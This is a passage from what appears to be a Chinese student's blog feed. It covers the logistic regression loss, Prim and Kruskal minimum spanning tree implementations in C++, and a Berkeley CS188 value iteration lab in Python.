(1-h_\theta(x^{(i)}))$<br>两边再除以$m$取个平均值，得到损失函数得表达式如下：</p><p>$J(\theta) = -\frac{1}{m} \sum_{i=1}^m y_i\ln h_\theta(x^{(i)}) + (1-y_i)\ln (1-h_\theta(x^{(i)}))$</p><p>之后就是进入梯度下降的步骤了</p><p>$\theta_j = \theta_j - \alpha\frac{\partial J(\theta)}{\partial\theta}, j = 1, 2, …, n$</p><p><strong>为什么我们费了这么大劲就是为了找这个损失函数，用平方误差不好吗？</strong><br>还记得我们前面说的吗？：<br>$\theta$会达到全局最优的条件是：我们的损失函数$J(\theta)$是凹函数<br>之前我们的预测值$h_\theta(x) = \theta^Tx$时，平方误差确实是凹函数，而我们现在的预测值改成了Sigmoid函数，即$h_\theta(x) = \frac{1}{1+e^{-\theta^Tx}}$，平方误差就不再是凹函数了，这点是是很致命的。</p><p><strong>那为什么我们现在的损失函数就是凹函数呢</strong><br>这点可以通过求$\frac{\partial^2 J(\theta)}{\partial\theta^2}&gt;0$去证明<br>可以参考：<a href="https://blog.csdn.net/lafengxiaoyu/article/details/109916750">为什么不用平方误差（MSE）作为Logistic回归的损失函数？_平方误差成本函数不适用于逻辑回归-CSDN博客</a></p><p>最终得到逻辑回归中梯度下降的表达式：<br>$\theta_j = \theta_j - \alpha\sum_{i=1}^m (h_\theta(x^{(i)})-y)x_j^{(i)}$<br>我们惊奇地发现！！它长得居然跟原来线性回归的梯度下降一样<br>不过特别要注意，这里的$h_\theta(x^{(i)})$跟线性回归有本质上的区别</p>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
            <tag> 线性回归 </tag>
            
            <tag> 逻辑回归 </tag>
            
            <tag> 梯度下降 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DS图-最小生成树</title>
      <link href="/2024/01/05/DS%E5%9B%BE-%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91/"/>
      <url>/2024/01/05/DS%E5%9B%BE-%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91/</url>
      
        <content type="html"><![CDATA[<p>复习数据结构打OJ顺便梳理一下Prim和Kruskal求最小生成树的思路</p><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>根据输入创建无向网。分别用Prim算法和Kruskal算法构建最小生成树。（假设：输入数据的最小生成树唯一。）</p><h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><p>顶点数n\<br>n个顶点\<br>边数m\<br>m条边信息,格式为：顶点1顶点2权值\<br>Prim算法的起点v</p><blockquote><p>6\<br>v1 v2 v3 v4 v5 v6 \<br>10\<br>v1 v2 6\<br>v1 v3 1\<br>v1 v4 5\<br>v2 v3 5\<br>v2 v5 3\<br>v3 v4 5\<br>v3 v5 6\<br>v3 v6 4\<br>v4 v6 2\<br>v5 v6 6\<br>v1</p><h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><p>输出最小生成树的权值之和\<br>对两种算法，按树的生长顺序，输出边信息(Kruskal中边顶点按数组序号升序输出)<br>15\<br>prim:\<br>v1 v3 1\<br>v3 v6 4\<br>v6 v4 2\<br>v3 v2 5\<br>v2 v5 3\<br>kruskal:\<br>v1 v3 1\<br>v4 v6 2\<br>v2 v5 3\<br>v3 v6 4\<br>v2 v3 5</p></blockquote><h2 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h2><h3 id="Prim"><a href="#Prim" class="headerlink" title="Prim"></a>Prim</h3><ol><li>维护一个数组dis，表示节点到最小生成树直接距离（有相邻节点在最小生成树中，否则为正无穷，初始为正无穷），已放到最小生成树中则为0。<blockquote><p>当有相邻节点被放入最小生成树中，且与该节点直接距离小于原本dis数组中保存的值时，更新dis中的值</p></blockquote></li><li>维护一个数组parent，表示节点与最小生成树相连时，直接连接的另一节点<blockquote><p>无需初始化，当dis更新时同步更新parent</p></blockquote></li><li>从起点开始，初始化各点的dis值为各点到起点的直接距离（如有），同时更新parent值也为起点，将起点放入最小生成树（dis值设为0）。</li><li>进入循环，每次取出dis值最小且非0的节点，将该节点与其父节点相连的边纳入最小生成树，并更新相邻节点的dis值和parent值。当最小生成树的边为节点数-1时退出循环<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Edge* <span class="title">Prim</span><span class="params">(<span class="type">const</span> string&amp; start)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> startIndex = <span class="built_in">strToIndex</span>(start);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;++i)</span><br><span class="line">        dis[i] = INF;</span><br><span class="line">    dis[startIndex] = <span class="number">0</span>;                    <span class="comment">//将起点放入最小生成树（dis值设为0）。</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">        <span class="keyword">if</span>(mat[i][startIndex])&#123;</span><br><span class="line">            dis[i] = mat[i][startIndex];    <span class="comment">//初始化各点的dis值为各点到起点的直接距离（如有）</span></span><br><span class="line">            parent[i] = startIndex;         <span class="comment">//同时更新parent值也为起点，</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Edge *mst = <span class="keyword">new</span> Edge[n<span class="number">-1</span>];</span><br><span class="line">    <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(cnt != n<span class="number">-1</span>)&#123;<span class="comment">//当最小生成树的边为节点数-1时退出循环</span></span><br><span class="line">        <span class="comment">//每次取出dis值最小且非0的节点</span></span><br><span class="line">        <span class="type">int</span> minIndex, min = INF;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(dis[i] &amp;&amp; dis[i] &lt; min)</span><br><span class="line">                minIndex = i, min = dis[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//将该节点与其父节点相连的边纳入最小生成树</span></span><br><span class="line">        mst[cnt++] = <span class="built_in">Edge</span>(parent[minIndex], minIndex, min);</span><br><span class="line">        dis[minIndex] = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//更新相邻节点的dis值和parent值</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(mat[i][minIndex] &amp;&amp; mat[i][minIndex] &lt; dis[i])&#123;</span><br><span class="line">                dis[i] = mat[i][minIndex];</span><br><span class="line">                parent[i] = minIndex;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> mst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Kruscal"><a href="#Kruscal" class="headerlink" title="Kruscal"></a>Kruscal</h3></li><li>维护一个优先队列pq，在初始化边的时候将每一条边放入优先队列，边的权值越小越靠前。</li><li>维护一个并查集set，当有边被纳入最小生成树时，将该边两点作并操作。一条边的两个点在同一集合中时,说明再将该边纳入最小生成树会使树成环，故丢弃该边。</li><li>进入循环，每次循环取出pq的队头（未纳入最小生成树的最短的一条边），判断该边是否合法（是否会使最小生成树成环），合法则将其纳入最小生成树，否则丢弃。当最小生成树的边为节点数-1时退出循环<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//并查集</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Set</span>&#123;</span><br><span class="line">    <span class="type">int</span> *parent;</span><br><span class="line">    <span class="built_in">Set</span>(<span class="type">int</span> range)&#123;</span><br><span class="line">        parent = <span class="keyword">new</span> <span class="type">int</span>[range];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;range;++i)</span><br><span class="line">            parent[i] = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">join</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">        parent[a] = b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">root</span><span class="params">(<span class="type">int</span> a)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(parent[a] == <span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">return</span> a;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">root</span>(parent[a]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">is_same</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">root</span>(a) == <span class="built_in">root</span>(b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//Kruskal</span></span><br><span class="line"><span class="function">Edge *<span class="title">Kruskal</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Edge *mst = <span class="keyword">new</span> Edge[n<span class="number">-1</span>];</span><br><span class="line">    <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(!pq.<span class="built_in">empty</span>() &amp;&amp; cnt != n<span class="number">-1</span>)&#123;</span><br><span class="line">        Edge temp = pq.<span class="built_in">top</span>();</span><br><span class="line">        pq.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">if</span>(!set-&gt;<span class="built_in">is_same</span>(temp.index1, temp.index2))&#123;</span><br><span class="line">            mst[cnt++] = temp;</span><br><span class="line">            set-&gt;<span class="built_in">join</span>(temp.index1, temp.index2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> mst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="处理输入输出"><a href="#处理输入输出" class="headerlink" title="处理输入输出"></a>处理输入输出</h3><ol><li>节点：string类型数组nodes保存所有节点，下标表示节点的id，方便用二维数组表示节点间的权值</li><li>最小生成树：自定义Edge类型表示一条边，成员变量int index1, index2, val 分别表示边的两个端点下标及边的权重。最小生成树为Edge类型的数组，即一组边。</li><li>int类型二维数组mat(matrix)保存保存节点间的权值(Prim中用于更新dis数组)\<br>Edge类型数组保存输入的每一条边，在初始化时push到优先队列中(Kruskal中用于贪心)<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> INF 0x3F3F3F3F</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX 10000</span></span><br><span class="line"><span class="comment">//图</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Graph</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    string nodes[MAX];</span><br><span class="line">    <span class="comment">//用于Prim算法的mat二维数组，dis数组和parent数组</span></span><br><span class="line">    <span class="type">int</span> mat[MAX][MAX];</span><br><span class="line">    <span class="type">int</span> dis[MAX];  </span><br><span class="line">    <span class="type">int</span> parent[MAX];    </span><br><span class="line">    <span class="comment">//用于Kruskal算法的最小堆（优先队列）和并查集</span></span><br><span class="line">    priority_queue&lt;Edge&gt; pq;    </span><br><span class="line">    Set *set;    </span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> n, m;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">// init nodes</span></span><br><span class="line">       std::cin&gt;&gt;n;</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;++i)</span><br><span class="line">           std::cin&gt;&gt;nodes[i];</span><br><span class="line">        <span class="comment">//init edges</span></span><br><span class="line">       <span class="built_in">memset</span>(mat, <span class="number">0</span>, <span class="built_in">sizeof</span>(mat));</span><br><span class="line">       std::cin&gt;&gt;m;</span><br><span class="line">       string node1, node2;</span><br><span class="line">       <span class="type">int</span> val;</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;m;++i)&#123;</span><br><span class="line">           std::cin&gt;&gt;node1&gt;&gt;node2&gt;&gt;val;</span><br><span class="line">           <span class="type">int</span> index1 = <span class="built_in">strToIndex</span>(node1), index2 = <span class="built_in">strToIndex</span>(node2);</span><br><span class="line">           /初始化mat二维数组</span><br><span class="line">           mat[index1][index2] = val;</span><br><span class="line">           mat[index2][index1] = val;</span><br><span class="line">           <span class="comment">//初始化优先队列</span></span><br><span class="line">           pq.<span class="built_in">push</span>(<span class="built_in">Edge</span>(index1, index2, val));</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">// init union-find-set</span></span><br><span class="line">       set = <span class="keyword">new</span> <span class="built_in">Set</span>(n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">strToIndex</span><span class="params">(<span class="type">const</span> string &amp;str)</span></span>&#123;</span><br><span class="line">        <span class="comment">//找到字符串对应id</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;++i)</span><br><span class="line">            <span class="keyword">if</span>(str == nodes[i])</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">Edge* <span class="title">Prim</span><span class="params">(<span class="type">const</span> string&amp; start)</span></span>&#123;</span><br><span class="line">        <span class="comment">//上面已实现</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">Edge *<span class="title">Kruskal</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//上面已实现</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">FindMST</span><span class="params">(<span class="type">const</span> string &amp;start)</span></span>&#123;</span><br><span class="line">        Edge *mst1 = <span class="built_in">Prim</span>(start);</span><br><span class="line">        <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;++i)</span><br><span class="line">            sum += mst1[i].val;</span><br><span class="line">        std::cout&lt;&lt;sum&lt;&lt;std::endl;</span><br><span class="line"></span><br><span class="line">        std::cout&lt;&lt;<span class="string">&quot;prim:&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;++i)&#123;</span><br><span class="line">            std::cout&lt;&lt;nodes[mst1[i].index1]&lt;&lt;<span class="string">&quot; &quot;</span></span><br><span class="line">                     &lt;&lt;nodes[mst1[i].index2]&lt;&lt;<span class="string">&quot; &quot;</span></span><br><span class="line">                     &lt;&lt;mst1[i].val&lt;&lt;std::endl;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        std::cout&lt;&lt;<span class="string">&quot;kruskal:&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">        Edge *mst2 = <span class="built_in">Kruskal</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;++i)&#123;</span><br><span class="line">            std::cout&lt;&lt;nodes[mst2[i].index1]&lt;&lt;<span class="string">&quot; &quot;</span></span><br><span class="line">                     &lt;&lt;nodes[mst2[i].index2]&lt;&lt;<span class="string">&quot; &quot;</span></span><br><span class="line">                     &lt;&lt;mst2[i].val&lt;&lt;std::endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Graph *graph = <span class="keyword">new</span> Graph;</span><br><span class="line">    graph-&gt;<span class="built_in">init</span>();</span><br><span class="line">    </span><br><span class="line">    string start;</span><br><span class="line">    std::cin&gt;&gt;start;</span><br><span class="line">    graph-&gt;<span class="built_in">FindMST</span>(start);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Prim算法 </tag>
            
            <tag> Kruskal算法 </tag>
            
            <tag> 最小生成树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AI导论实验之网格游戏（马尔可夫决策）</title>
      <link href="/2023/12/22/AI%E5%AF%BC%E8%AE%BA%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%BD%91%E6%A0%BC%E6%B8%B8%E6%88%8F%EF%BC%88%E9%A9%AC%E5%B0%94%E5%8F%AF%E5%A4%AB%E5%86%B3%E7%AD%96%EF%BC%89/"/>
      <url>/2023/12/22/AI%E5%AF%BC%E8%AE%BA%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%BD%91%E6%A0%BC%E6%B8%B8%E6%88%8F%EF%BC%88%E9%A9%AC%E5%B0%94%E5%8F%AF%E5%A4%AB%E5%86%B3%E7%AD%96%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="问题1：价值迭代"><a href="#问题1：价值迭代" class="headerlink" title="问题1：价值迭代"></a>问题1：价值迭代</h1><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>实验来源于<a href="https://inst.eecs.berkeley.edu/~cs188/fa19/project3/">伯克利CS188</a>\<br>项目已将问题形式化为<strong>马尔可夫决策过程</strong>（Markov decision process，MDP），即MDP\<br>在 valueIterationAgents.py 中，ValueIterationAgent 类构造方法接收MDP（无折扣因子）及折扣因子\<br>我们需要做的是实现以下方法包括：</p><ul><li>runValueIteration: 执行价值迭代</li><li>computeActionFromValues(state)：根据self.values给出的值函数计算最佳行动</li><li>computeQValueFromValues(state, action)：返回根据self.values给出的值函数给出的（状态, 动作）对的Q值<h2 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h2></li></ul><p><a href="https://hrl.boyuai.com/chapter/1/%E9%A9%AC%E5%B0%94%E5%8F%AF%E5%A4%AB%E5%86%B3%E7%AD%96%E8%BF%87%E7%A8%8B/#34-%E9%A9%AC%E5%B0%94%E5%8F%AF%E5%A4%AB%E5%86%B3%E7%AD%96%E8%BF%87%E7%A8%8B">马尔可夫决策过程</a>由五元组$<S,A,P,r,γ>$构成，项目的MDP已经提供了以下接口：</p><ul><li>mdp.getStates()：获取MDP的所有状态</li><li>mdp.getPossibleActions(state)：当状态确定时，可能发生的所有动作</li><li>mdp.getTransitionStatesAndProbs(state, action)：当状态和动作确定时，所有可能的下一状态及其发生的概率</li><li>mdp.getReward(state, action, nextState)：当状态，动作及下一状态确定时，得到的即时回报</li><li>mdp.isTerminal(state)：判断状态是否为终止状态</li></ul><p>价值迭代算法\<br>对每个状态$s$, 找到动作$a$使动作价值最大为$Q_m$, 更新s对应的状态价值$V=Q_m$及对应的策略为$a$</p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 价值迭代模板</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">runValueIteration</span>(<span class="params">self</span>):</span><br><span class="line">    delta = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        new_values = util.Counter()     <span class="comment"># new values after iteration</span></span><br><span class="line">        <span class="keyword">for</span> state <span class="keyword">in</span> self.mdp.getStates():</span><br><span class="line">            max_value = -<span class="built_in">float</span>(<span class="string">&quot;inf&quot;</span>)</span><br><span class="line">            <span class="keyword">for</span> action <span class="keyword">in</span> self.mdp.getPossibleActions(state):</span><br><span class="line">                value = self.computeQValueFromValues(state=state, action=action)</span><br><span class="line">                max_value = <span class="built_in">max</span>(value, max_value)</span><br><span class="line">            new_values[state] = max_value <span class="keyword">if</span> max_value != -<span class="built_in">float</span>(<span class="string">&quot;inf&quot;</span>) <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            delta = <span class="built_in">max</span>(<span class="built_in">abs</span>(new_values[state] - self.values[state]), delta))</span><br><span class="line">        self.values = new_values        <span class="comment"># update values, also policy</span></span><br><span class="line">        <span class="keyword">if</span> self.theta &lt; delta:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment"># 实验要求命令行输入迭代次数 -i &lt;iterations&gt;, 故修改为</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">runValueIteration</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.iterations):</span><br><span class="line">        new_values = util.Counter()     <span class="comment"># new values after iteration</span></span><br><span class="line">        <span class="keyword">for</span> state <span class="keyword">in</span> self.mdp.getStates():</span><br><span class="line">            max_value = -<span class="built_in">float</span>(<span class="string">&quot;inf&quot;</span>)</span><br><span class="line">            <span class="keyword">for</span> action <span class="keyword">in</span> self.mdp.getPossibleActions(state):</span><br><span class="line">                value = self.computeQValueFromValues(state=state, action=action)</span><br><span class="line">                max_value = <span class="built_in">max</span>(value, max_value)</span><br><span class="line">            new_values[state] = max_value <span class="keyword">if</span> max_value != -<span class="built_in">float</span>(<span class="string">&quot;inf&quot;</span>) <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            delta = <span class="built_in">max</span>(<span class="built_in">abs</span>(new_values[state] - self.values[state]), delta))</span><br><span class="line">        self.values = new_values        <span class="comment"># update values, also policy</span></span><br></pre></td></tr></table></figure><p>计算动作价值Q<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 根据公式应该使用的函数模板</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">computeQValueFromValues</span>(<span class="params">self, state, action</span>):</span><br><span class="line">    <span class="built_in">sum</span> = self.mdp.getReward(state, action)</span><br><span class="line">    <span class="keyword">for</span> nextState, prob <span class="keyword">in</span> self.mdp.getTransitionStatesAndProbs(state=state, action=action):</span><br><span class="line">        <span class="built_in">sum</span> += self.discount * prob * self.getValue(nextState)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span></span><br><span class="line"><span class="comment"># 由于mdp提供的getReward需要三个参数state, action, nextState, 故修改为</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">computeQValueFromValues</span>(<span class="params">self, state, action</span>):</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> nextState, prob <span class="keyword">in</span> self.mdp.getTransitionStatesAndProbs(state=state, action=action):</span><br><span class="line">        <span class="built_in">sum</span> += prob * </span><br><span class="line">            (self.mdp.getReward(state, action) + self.discount * self.getValue(nextState) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span></span><br></pre></td></tr></table></figure><br>根据state得到最好的action<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">computeActionFromValues</span>(<span class="params">self, state</span>):</span><br><span class="line">    max_value = -<span class="built_in">float</span>(<span class="string">&quot;inf&quot;</span>)</span><br><span class="line">    best_action = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> action <span class="keyword">in</span> self.mdp.getPossibleActions(state):</span><br><span class="line">        <span class="comment"># 与价值迭代中求Q值最大的action类似</span></span><br><span class="line">        value = self.computeQValueFromValues(state=state, action=action)</span><br><span class="line">        <span class="keyword">if</span> value &gt; max_value:</span><br><span class="line">            best_action = action</span><br><span class="line">            max_value = value</span><br><span class="line">    <span class="keyword">return</span> best_action</span><br></pre></td></tr></table></figure></p><h1 id="问题2：过桥分析"><a href="#问题2：过桥分析" class="headerlink" title="问题2：过桥分析"></a>问题2：过桥分析</h1><p>由题，noise表示智能体在执行操作时以意外的后继状态结束的频率，有一定概率不遵循我们计算得到的策略。故将noise设置为0.0，即可通过测试。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">question2</span>():</span><br><span class="line">    answerDiscount = <span class="number">0.9</span></span><br><span class="line">    answerNoise = <span class="number">0.0</span></span><br><span class="line">    <span class="keyword">return</span> answerDiscount, answerNoise</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 课程实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 强化学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java利用RMI实现http请求服务</title>
      <link href="/2023/12/17/Java%E5%88%A9%E7%94%A8RMI%E5%AE%9E%E7%8E%B0http%E8%AF%B7%E6%B1%82%E6%9C%8D%E5%8A%A1/"/>
